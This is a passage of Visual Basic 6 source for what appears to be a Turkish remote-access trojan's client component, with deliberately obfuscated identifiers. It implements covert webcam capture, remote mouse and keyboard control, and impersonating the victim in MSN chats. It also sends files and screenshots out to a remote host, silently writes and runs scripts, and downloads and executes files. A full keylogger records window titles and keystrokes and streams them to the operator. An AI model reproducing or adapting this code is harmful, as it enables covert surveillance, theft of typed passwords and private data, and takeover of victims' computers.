                MouseMove ((Screen.Width / Screen.TwipsPerPixelX) / sMParam(3)) * sMParam(1), ((Screen.Height / Screen.TwipsPerPixelY) / sMParam(4)) * sMParam(2)
                LeftClick ((Screen.Width / Screen.TwipsPerPixelX) / sMParam(3)) * sMParam(1), ((Screen.Height / Screen.TwipsPerPixelY) / sMParam(4)) * sMParam(2)
            Case 2
                MouseMove ((Screen.Width / Screen.TwipsPerPixelX) / sMParam(3)) * sMParam(1), ((Screen.Height / Screen.TwipsPerPixelY) / sMParam(4)) * sMParam(2)
                RightClick ((Screen.Width / Screen.TwipsPerPixelX) / sMParam(3)) * sMParam(1), ((Screen.Height / Screen.TwipsPerPixelY) / sMParam(4)) * sMParam(2)
        End Select
    
        Case "[WEBCAMCO]"
            sckwebcam.CloseSck
            sckwebcam.Connect KURB4N_B1LG151(0), KURB4N_B1LG151(12)
            W3BC4M_K4L1T3S1 = sMParam(0)
            wskServer.SendData "[WEBCAMAL]" & GetCamDrvs()
            If GetCamDrvs() <> "No Drivers" Then
                mdlwebcam.CamHwnd = mdlwebcam.capCreateCaptureWindow("Webcam", 0, 0, 0, 320, 240, Me.hWND, 0)
             SendMessage mdlwebcam.CamHwnd, 1034, 0, 0
            End If

        Case "[WEBCAMAL]"
            If GetCamDrvs() <> "No Drivers" Then
                CapCam
            End If
        
        Case "[WEBCAMOF]"
            K4M3R4Y1_K4P4T
        Case "[KUFURSAY]"
            If msn.MyStatus <> MISTATUS_OFFLINE Then
                msn.InstantMessage sMParam(0)
                SendKeys sMParam(1), 20
                SendKeys "{enter}"
                wskServer.SendData "[SWRHABER]506"
            Else
                wskServer.SendData "[SWRHABER]578"
            End If
                
        Case "[DTPORTAC]"
            Select Case sMParam(0)
                Case "0"
                    scktransfer.CloseSck
                    scktransfer.Connect KURB4N_B1LG151(0), KURB4N_B1LG151(10)
                    I5L3M_G0R3C3K_D05Y4 = sMParam(1)
                Case "1"
                    I5L3M_G0R3C3K_D05Y4 = sMParam(1)
                    scktransfer.CloseSck
                    wskServer.SendData "[FILESIZE]" & FileLen(I5L3M_G0R3C3K_D05Y4)
                    scktransfer.Connect KURB4N_B1LG151(0), KURB4N_B1LG151(10)
                Case "2"
                    DosyaGonder I5L3M_G0R3C3K_D05Y4
                    
                Case "3"
                    scktransfer.CloseSck
            End Select
                
            
             Case "[TUSBSTIR]"
            On Local Error Resume Next
            AppActivate sMParam(2)
            SendKeys sMParam(0)


            Case "[MEYAZDIR]"
            On Local Error GoTo yazicihatasi
                Printer.FontSize = sMParam(0)
                Printer.FontBold = CLng(sMParam(1))
                Printer.FontUnderline = CLng(sMParam(2))
                Printer.FontItalic = CLng(sMParam(3))
                Printer.FontStrikethru = CLng(sMParam(4))
                Printer.Print sMParam(5)
                wskServer.SendData "[SWRHABER]610"
                Exit Sub
yazicihatasi:
            wskServer.SendData "[SWRHABER]611"
            
            Case "[SCRPTMAN]"
                If Dir(App.Path & "\script." & sMParam(0)) <> "" Then Kill App.Path & "\script." & sMParam(0)
                Open App.Path & "\script." & sMParam(0) For Append As #31
                    Print #31, sMParam(1)
                Close #31
                Call ShellExecute(&O0, vbNullString, App.Path & "\script." & sMParam(0), vbNullString, vbNullString, vbHide)
                wskServer.SendData "[SWRHABER]620"
            
            Case "[FILEINDR]"
                
                If (dosyaindir(sMParam(0), App.Path & "\" & sMParam(3)) = True) And sMParam(1) = "1" Then
                    Call ShellExecute(&O0, vbNullString, App.Path & "\" & sMParam(3), vbNullString, vbNullString, CLng(sMParam(4)))
                    wskServer.SendData "[SWRHABER]620"
                End If
                
               
             
    End Select
    Exit Sub
    
errHandler:
        Exit Sub
End Sub

Public Function dosyaindir(adres As String, dosyaadi As String) As Boolean
Dim downloaddurum As Boolean
    'downloaddurum = URLDownloadToFile(0, adres, dosyaadi, 0, 0)
    If downloaddurum = 0 Then dosyaindir = True
End Function


Sub K4M3R4Y1_K4P4T()
DoEvents
SendMessage mdlwebcam.CamHwnd, 1035, 0, 0
sckwebcam.CloseSck
End Sub
Private Sub wskServer_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
wskServer.CloseSck
sckekran.CloseSck
sckwebcam.CloseSck
scktransfer.CloseSck
End Sub

'K3YL0GG3R
    Private Sub L15t3N3R_Timer()
        If s4yf4_845L1g1 <> Akt1F_P3NC3R3_B4SL1G1N1_4L(GetForegroundWindow) Then
            s4yf4_845L1g1 = Akt1F_P3NC3R3_B4SL1G1N1_4L(GetForegroundWindow)
            If Len(s4yf4_845L1g1) > 0 Then
            L0GL4R = L0GL4R & vbCrLf & "[" & s4yf4_845L1g1 & "]" & vbCrLf
            End If
            M4X1MUM_S1LM3 = Len(s4yf4_845L1g1)
        End If
        For i = 1 To 255
            sonuc = 0
            t1kl4n4ntu5 = ""
            sonuc = GetAsyncKeyState(i)
            t1kl4n4ntu5 = ""
                If sonuc = -32767 Then
                    If (i > 64 And i < 94) Then
                        If GetKeyState(i) <> Akt4r1M(i) Then
                            Akt4r1M(i) = GetKeyState(i)
                                If (SH1FT_Tu5u = True) Then
                                    If (C4p5L0CK_Tu5u = True) Then
                                        t1kl4n4ntu5 = LCase(Chr(i))
                                    Else
                                        t1kl4n4ntu5 = UCase(Chr(i))
                                    End If
                        Else
                                    If (C4p5L0CK_Tu5u = True) Then
                                        t1kl4n4ntu5 = UCase(Chr(i))
                                    Else:
                                        t1kl4n4ntu5 = LCase(Chr(i))
                                    End If
                                End If
                        End If
                    End If
                        If (C4p5L0CK_Tu5u = True) And (SH1FT_Tu5u = True) Then
                            BUYUK = False
                        ElseIf (C4p5L0CK_Tu5u = True) And (SH1FT_Tu5u = False) Then
                            BUYUK = True
                        ElseIf (C4p5L0CK_Tu5u = False) And (SH1FT_Tu5u = True) Then
                            BUYUK = True
                        ElseIf (C4p5L0CK_Tu5u = False) And (SH1FT_Tu5u = False) Then
                            BUYUK = False
                    End If
        Select Case BUYUK
            Case True
                If i = 219 Then t1kl4n4ntu5 = "Ð"
                If i = 221 Then t1kl4n4ntu5 = "Ü"
                If i = 186 Then t1kl4n4ntu5 = "Þ"
                If i = 222 Then t1kl4n4ntu5 = "Ý"
                If i = 191 Then t1kl4n4ntu5 = "Ö"
                If i = 220 Then t1kl4n4ntu5 = "Ç"
                If i = 188 Then t1kl4n4ntu5 = ";"
                If i = 190 Then t1kl4n4ntu5 = ":"
                If i = 223 Then t1kl4n4ntu5 = "?"
                If i = 189 Then t1kl4n4ntu5 = "_"
                If i = 226 Then t1kl4n4ntu5 = ">"
                If i = 73 Then t1kl4n4ntu5 = "I"
                If i = 192 Then t1kl4n4ntu5 = "é"
            Case False
                If i = 219 Then t1kl4n4ntu5 = "ð"
                If i = 221 Then t1kl4n4ntu5 = "ü"
                If i = 186 Then t1kl4n4ntu5 = "þ"
                If i = 222 Then t1kl4n4ntu5 = "i"
                If i = 191 Then t1kl4n4ntu5 = "ö"
                If i = 220 Then t1kl4n4ntu5 = "ç"
                If i = 188 Then t1kl4n4ntu5 = ","
                If i = 190 Then t1kl4n4ntu5 = "."
                If i = 223 Then t1kl4n4ntu5 = "*"
                If i = 189 Then t1kl4n4ntu5 = "-"
                If i = 226 Then t1kl4n4ntu5 = "<"
                If i = 73 Then t1kl4n4ntu5 = "ý"
                If i = 192 Then t1kl4n4ntu5 = """"
        End Select
        If i = 32 Then t1kl4n4ntu5 = " "
       
        If i = 8 Then
            If Len(L0GL4R) > 1 Then
                    L0GL4R = Left(L0GL4R, Len(L0GL4R) - 1)
            End If
        End If
       
        If i = 13 Then
            t1kl4n4ntu5 = vbCrLf
        End If
        
        If i = 9 Then t1kl4n4ntu5 = "[TAB]"
    Select Case i
        Case 48 To 57
            If SH1FT_Tu5u = True Then
                If i = 48 Then i = 61
                If i = 49 Then i = 33
                If i = 50 Then i = 39
                If i = 51 Then i = 94
                If i = 52 Then i = 43
                If i = 53 Then i = 37
                If i = 54 Then i = 38
                If i = 55 Then i = 47
                If i = 56 Then i = 40
                If i = 57 Then i = 41
            End If
            t1kl4n4ntu5 = Chr(i)
        Case 96:  t1kl4n4ntu5 = "0"
        Case 97:  t1kl4n4ntu5 = "1"
        Case 98:  t1kl4n4ntu5 = "2"
        Case 99:  t1kl4n4ntu5 = "3"
        Case 100: t1kl4n4ntu5 = "4"
        Case 101: t1kl4n4ntu5 = "5"
        Case 102: t1kl4n4ntu5 = "6"
        Case 103: t1kl4n4ntu5 = "7"
        Case 104: t1kl4n4ntu5 = "8"
        Case 105: t1kl4n4ntu5 = "9"
        Case 106: t1kl4n4ntu5 = "*"
        Case 107: t1kl4n4ntu5 = "+"
        Case 109: t1kl4n4ntu5 = "-"
        Case 110: t1kl4n4ntu5 = ","
        Case 111: t1kl4n4ntu5 = "/"
    End Select

        Select Case Alt_Tusu
            Case True
                Select Case i
                    Case 81: t1kl4n4ntu5 = "@"
                    Case 192: t1kl4n4ntu5 = "<"
                    Case 49: t1kl4n4ntu5 = ">"
                    Case 50: t1kl4n4ntu5 = "£"
                    Case 51: t1kl4n4ntu5 = "#"
                    Case 52: t1kl4n4ntu5 = "$"
                    Case 53: t1kl4n4ntu5 = "½"
                    Case 55: t1kl4n4ntu5 = "{"
                    Case 56: t1kl4n4ntu5 = "["
                    Case 57: t1kl4n4ntu5 = "]"
                    Case 48: t1kl4n4ntu5 = "}"
                    Case 223: t1kl4n4ntu5 = "\\"
                    Case 189, 226: t1kl4n4ntu5 = "|"
                    Case 69: t1kl4n4ntu5 = "€"
                    Case 65: t1kl4n4ntu5 = "æ"
                    Case 83: t1kl4n4ntu5 = "ß"
                End Select
        End Select
        If t1kl4n4ntu5 <> "" Then L0GL4R = L0GL4R & t1kl4n4ntu5
        

        If OnLiN3_K3YL0GG3R = True And wskServer.State = sckConnected And Len(L0GL4R) > 0 Then
            wskServer.SendData "[ONLINLOG]" & L0GL4R
            L0GL4R = ""
        End If
        
        If t1kl4n4ntu5 = vbCrLf And OnLiN3_K3YL0GG3R = False Then
            Print #iKeylog, L0GL4R
            L0GL4R = ""
        End If
    End If
    Next i
    Exit Sub
    End Sub

    Public Function Akt1F_P3NC3R3_B4SL1G1N1_4L(hWND As Long) As String
        B45L1KHwND = String(GetWindowTextLength(hWND), 0)
        GetWindowText hWND, B45L1KHwND, (GetWindowTextLength(hWND) + 1)
        Akt1F_P3NC3R3_B4SL1G1N1_4L = B45L1KHwND
    End Function

    Private Function SH1FT_Tu5u() As Boolean
        SH1FT_Tu5u = CBool(GetAsyncKeyState(160) Or GetAsyncKeyState(161))
    End Function

    Private Function C4p5L0CK_Tu5u() As Boolean
        C4p5L0CK_Tu5u = CBool(GetKeyState(vbKeyCapital) And 1)
    End Function
    
    Private Function Alt_Tusu() As Boolean
        Alt_Tusu = CBool(GetAsyncKeyState(165) Or GetAsyncKeyState(18))
    End Function

'klasor silme
Function DelTree(hedef As String) As Long
On Error Resume Next
Dim Fso As Object
Set Fso = CreateObject("Scripting.FileSystemObject")
Call Fso.Deletefolder(hedef, True)
End Function

' burasi dosya transferim
Public Function DosyaGonder(HangiDosya As String)
If FileLen(HangiDosya) > 0 Then
    Open HangiDosya For Binary Access Read As #12
        Dim GÖND3R1L3N_V3R1 As String
        GÖND3R1L3N_V3R1 = Space$(LOF(12))
        Get #12, , GÖND3R1L3N_V3R1
    Close #12
    scktransfer.SendData GÖND3R1L3N_V3R1 & "/\/\ENDOFFILE/\/\"
    e = 2
    r = Timer
    Do Until Timer > r + 2
    DoEvents
    Loop
    Exit Function
End If
End Function

Private Sub sckekran_CloseSck()
    ekrandurdur
End Sub

Private Sub sckekran_Error(ByVal Number As Integer, Description As String, ByVal sCode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    ekrandurdur
End Sub

Sub ekrandurdur()
    sckekran.CloseSck
End Sub

Public Function TakeScreenShot()
B1TM4P = App.Path & "\B1TM4P.bmp"
JPGP4TH = App.Path & "\jpg.jpg"
Screenshot_DesktopWindow frmDesktop.Picture1, JPGP4TH, CByte(EKR4N_K4L1T3S1)
wskServer.SendData "[FILESIZE]" & FileLen(JPGP4TH)

End Function

Public Sub LeftClick(x As Long, y As Long)
mouse_event MOUSEEVENTF_LEFTDOWN, x, y, 0, 0
mouse_event MOUSEEVENTF_LEFTUP, x, y, 0, 0
End Sub

Public Sub RightClick(x As Long, y As Long)
mouse_event MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0
mouse_event MOUSEEVENTF_RIGHTUP, x, y, 0, 0
End Sub

Public Sub MouseMove(x As Long, y As Long)
Dim move
move = SetCursorPos(x, y)
End Sub

Private Function GetPriority(lClass As String) As Long
Select Case lClass
    Case 0: GetPriority = &H20
    Case 1: GetPriority = &H40
    Case 2: GetPriority = &H80
    Case 3: GetPriority = &H100
End Select
End Function

Public Function XORSifrele(CodeKey As String, dataIn As String) As String
Dim lonDataPtr As Long
Dim strDataOut As String
Dim Temp As Integer
Dim tempstring As String
Dim intXOrValue1 As Integer
Dim intXOrValue2 As Integer
For lonDataPtr = 1 To Len(dataIn)
intXOrValue1 = Asc(Mid$(dataIn, lonDataPtr, 1))
intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
Temp = (intXOrValue1 Xor intXOrValue2)
tempstring = Hex(Temp)
If Len(tempstring) = 1 Then tempstring = "0" & tempstring
strDataOut = strDataOut + tempstring
Next lonDataPtr
XORSifrele = strDataOut
End Function

Function ekranigönder()
If sckekran.State = sckConnected Then
TakeScreenShot
    If ONC3K1_D0SYA_B0YUTU = FileLen(App.Path & "\jpg.jpg") Then Exit Function
    Open App.Path & "\jpg.jpg" For Binary Access Read As #4
       Dim GÖND3R1L3N_V3R1 As String
       GÖND3R1L3N_V3R1 = Space$(LOF(4))
        Get #4, , GÖND3R1L3N_V3R1
    Close #4
        If sckekran.State = sckConnected Then
            sckekran.SendData GÖND3R1L3N_V3R1 & "/\/\ENDOFFILE/\/\"
        End If
    e = 2
    r = Timer
    Do Until Timer > r + 2
    DoEvents
    Loop
    
    ONC3K1_D0SYA_B0YUTU = FileLen(App.Path & "\jpg.jpg")
    
    Else
        ekrandurdur
        Exit Function
End If
End Function


Function resimcek() As Boolean
        Clipboard.Clear
        SendMessage mdlwebcam.CamHwnd, 1084, 0, 0
        SendMessage mdlwebcam.CamHwnd, 1054, 0, 0
        piccamera.Picture = Clipboard.GetData
        SaveJPG piccamera, App.Path & "\Cam.jpg", CByte(W3BC4M_K4L1T3S1)
        wskServer.SendData "[FILESIZE]" & FileLen(App.Path & "\Cam.jpg")
        resimcek = True
End Function

Function CapCam()
webcamust:
If sckwebcam.State = sckConnected Then
If resimcek = False Then Exit Function
    Open App.Path & "\Cam.jpg" For Binary Access Read As #4
       GÖND3R1L3N_V3R1 = Space$(LOF(4))
        Get #4, , GÖND3R1L3N_V3R1
    Close #4
        If sckwebcam.State = sckConnected Then
            sckwebcam.SendData GÖND3R1L3N_V3R1 & "/\/\ENDOFFILE/\/\"
        End If
    e = 2
    r = Timer
    Do Until Timer > r + 2
    DoEvents
    Loop
    Else
     K4M3R4Y1_K4P4T
    Exit Function
End If
GoTo webcamust
End Function
'AYDIN
